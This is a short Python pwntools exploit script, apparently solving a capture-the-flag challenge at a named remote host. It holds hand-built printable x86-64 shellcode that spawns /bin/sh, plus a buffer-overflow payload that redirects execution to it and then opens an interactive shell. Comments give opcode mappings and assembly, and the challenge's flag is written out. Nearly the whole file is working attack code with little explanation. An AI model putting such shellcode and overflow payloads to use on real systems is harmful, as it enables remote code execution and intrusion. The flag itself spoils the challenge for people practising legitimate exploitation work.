#!/usr/bin/env python
from pwn import *

# AD{S0meth1ng_usefu1_0n_7he_st4ck!}

host , port = 'ctf.yuawn.idv.tw' , 10110
#host , port = '192.168.78.135' , 4000
y = remote( host , port )

'''
\\  = pop rsp
P   = push rax
j;  = push 0x3b
X   = pop rax
T   = push rsp
_   = pop rdi
4;  = xor al, 0x3b
^   = pop rsi
Z   = pop rdx
Y   = pop rcx
'''

'''
    push 0x3b
    pop rax
    xor al, 0x3b
    push rax
    push rax
    pop rsi
    pop rdx

    push 0x3b3a5a3b
    pop rax
    xor rax, 0x3b5a4b3b
    push rax
    pop rsp

    push 0x3b3b3e34
    pop rax
    xor rax, 0x3b3b3b3b
    push rax
    
'''

name = 0x6010c0 # 0x601100 = 0x3b3a5a3b ^ 0x3b5a4b3b

sc = 'j;X4;PP^ZXXXXXXXXXXXXh4>;;XH5;;;;PXXXXj;XT_j;YYY' + 'D' * 0x20 + '/bin/sh' 
sc = 'j;X4;PP^Zh;Z:;XH5;KZ;P\\h4>;;XH5;;;;P'

print len( sc )

y.sendafter( ']:' , sc )

y.send( 'D' * 0x10 + p64( 0 ) + p64( name ) )

sleep(1)

#y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()